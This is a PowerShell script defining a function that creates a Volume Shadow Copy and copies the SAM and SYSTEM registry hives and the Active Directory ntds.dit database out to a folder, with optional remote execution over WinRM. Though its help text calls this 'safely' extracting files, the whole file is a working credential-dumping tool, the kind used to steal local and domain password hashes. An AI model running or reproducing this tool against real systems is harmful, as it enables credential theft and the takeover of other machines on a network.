function Invoke-SystemSnapshot {
    <#
    .SYNOPSIS
    Creates a temporary VSS shadow copy to safely extract system registry hives or NTDS database.

    .DESCRIPTION
    This function creates a VSS snapshot of the system volume and copies sensitive system files (SAM, SYSTEM, and NTDS.DIT if available) to a destination folder without locking issues.

    .EXAMPLE
    Invoke-SystemSnapshot -Volume "C:\" -Destination "C:\Extracted"

    .NOTES
    v0.0.1
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false, HelpMessage = "The volume to snapshot")]
        [string]$Volume = "C:\",

        [Parameter(Mandatory = $false, HelpMessage = "Folder where copied files will be stored")]
        [string]$Destination = "C:\Temp",

        [Parameter(Mandatory = $false, HelpMessage = "Remote computer for WinRM execution")]
        [string]$ComputerName,

        [Parameter(Mandatory = $false, HelpMessage = "Username for remote execution")]
        [string]$User,

        [Parameter(Mandatory = $false, HelpMessage = "Password for remote execution")]
        [string]$Pass
    )
    if ($ComputerName) {
        if (-not ($User -and $Pass)) {
            Write-Error "Both -Username and -Password are required for remote execution."
            return
        }
        $secure = ConvertTo-SecureString $Pass -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential ($User, $secure)
        Write-Host "Connecting to $ComputerName via WinRM..." -ForegroundColor Cyan
        try {
            Invoke-Command -ComputerName $ComputerName -Credential $cred -ScriptBlock ${function:Invoke-SystemSnapshot} `
                -ArgumentList $Volume, $Destination
        }
        catch {
            Write-Error "Remote execution failed: $($_.Exception.Message)"
        }
        return
    }
    try {
        if (-not (Test-Path $Destination)) {
            Write-Host "Creating destination directory: $Destination" -ForegroundColor Yellow
            New-Item -ItemType Directory -Path $Destination -Force | Out-Null
        }
        $Vss = Get-Service -Name 'VSS' -ErrorAction Stop
        $WasRunning = $Vss.Status -eq 'Running'
        if (-not $WasRunning) {
            Write-Host "Starting VSS service..." -ForegroundColor Yellow
            Start-Service -Name 'VSS'
            Start-Sleep -Seconds 2
        }
        Write-Host "Creating VSS snapshot for $Volume ..." -ForegroundColor Cyan
        $Shadow = Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{
            Volume  = $Volume
            Context = 'ClientAccessible'
        } -ErrorAction Stop

        if ($Shadow.ReturnValue -ne 0) {
            throw "Failed to create shadow copy (error code: $($Shadow.ReturnValue))."
        }
        $ShadowID = $Shadow.ShadowID
        $Snapshot = Get-CimInstance Win32_ShadowCopy -Filter "ID='$ShadowID'" -ErrorAction Stop
        $DevicePath = $Snapshot.DeviceObject
        Write-Host "Shadow copy created: $DevicePath" -ForegroundColor Green
        $FileList = @(
            "$DevicePath\Windows\System32\config\SAM",
            "$DevicePath\Windows\System32\config\SYSTEM"
        )
        if (Test-Path "$DevicePath\Windows\NTDS\ntds.dit") {
            $FileList += "$DevicePath\Windows\NTDS\ntds.dit"
        }
        Write-Host "Copying system files to $Destination ..." -ForegroundColor Yellow
        foreach ($Src in $FileList) {
            try {
                $FileName = Split-Path $Src -Leaf
                $Target = Join-Path $Destination $FileName
                Copy-Item -Path $Src -Destination $Target -ErrorAction Stop
                Write-Host "✔ Copied: $FileName" -ForegroundColor Green
            }
            catch {
                Write-Warning "Failed to copy: $Src — $($_.Exception.Message)"
            }
        }
        Write-Host "Deleting shadow copy..." -ForegroundColor Cyan
        try {
            Remove-CimInstance -InputObject $Snapshot -ErrorAction Stop
            Write-Host "✔ Shadow copy deleted." -ForegroundColor DarkGray
        }
        catch {
            Write-Warning "Failed to delete shadow copy automatically. You may remove it manually via vssadmin list shadows."
        }
        if (-not $WasRunning) {
            Write-Host "Stopping VSS service (restoring original state)..." -ForegroundColor DarkGray
            Stop-Service -Name 'VSS'
        }
        Write-Host "`n✅ Snapshot operation completed successfully!" -ForegroundColor Green
        Write-Host "Files saved in: $Destination" -ForegroundColor Cyan
    }
    catch {
        Write-Error "Snapshot operation failed: $($_.Exception.Message)"
    }
}
